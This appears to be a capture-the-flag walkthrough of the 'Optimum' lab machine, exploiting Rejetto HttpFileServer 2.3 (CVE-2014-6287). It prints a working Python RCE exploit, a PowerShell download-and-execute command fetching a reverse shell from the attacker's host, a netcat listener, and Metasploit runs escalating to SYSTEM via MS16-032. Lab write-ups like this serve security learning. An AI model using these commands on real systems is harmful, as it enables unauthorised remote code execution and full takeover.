# Nmap

```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.8
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-29 06:12 +0700
Nmap scan report for 10.10.10.8
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

```bash
> nmap -Pn -p80 -sCV 10.10.10.8
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-29 06:13 +0700
Nmap scan report for 10.10.10.8
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```


# Manual Exploit

## Searchsploit

```bash
> searchsploit httpfileserver
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path
--------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                            | windows/webapps/49125.py
--------------------------------------------------------------------------------------- ----------------------------

> searchsploit httpfileserver --id
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  EDB-ID
--------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                            | 49125
--------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```bash

> searchsploit -x 49125

# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: <C3><93>scar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)

except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)
```

```bash
> python optimum.py 10.10.10.8 80 "ping 10.10.14.2"
http://10.10.10.8:80/?search=%00{.+exec|ping%2010.10.14.2.}
```


```bash
> ls
optimum-2.py  optimum.py
>
> python3 optimum.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:4444/mini-reverse.ps1')"
http://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.2%3A4444/mini-reverse.ps1%27%29.}
```

```bash
> vim mini-reverse.ps1
> python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.10.8 - - [29/Aug/2025 06:32:24] "GET /mini-reverse.ps1 HTTP/1.1" 200 -
```

```bash
> nc -nvlp 4445
> nc -nvlp 4445
Connection from 10.10.10.8:49163
> whoami
optimum\kostas
```

## Priv Escalation

<mark style="background: #FF5582A6;">NOT YET!!</mark>
# Metasploit

## windows/http/rejetto_hfs_exec

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Using URL: http://10.10.14.2:4445/9uz3kv
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /9uz3kv
[*] Sending stage (177734 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\ArdqW.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.8:49170) at 2025-08-29 06:41:21 +0700
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas
```

## post/multi/recon/local_exploit_suggester

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
/opt/metasploit/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/opt/metasploit/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems
[*] 10.10.10.8 - 205 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > back
```

## windows/local/ms16_032_secondary_logon_handle_privesc

```bash

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4445

lport => 4445
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.14.2:4445
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\NwKCytU.ps1...
[*] Compressing script contents...
[+] Compressed size: 3729
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 1660 created.
```

# Reff

https://www.youtube.com/watch?v=KrUZsCW7Ces
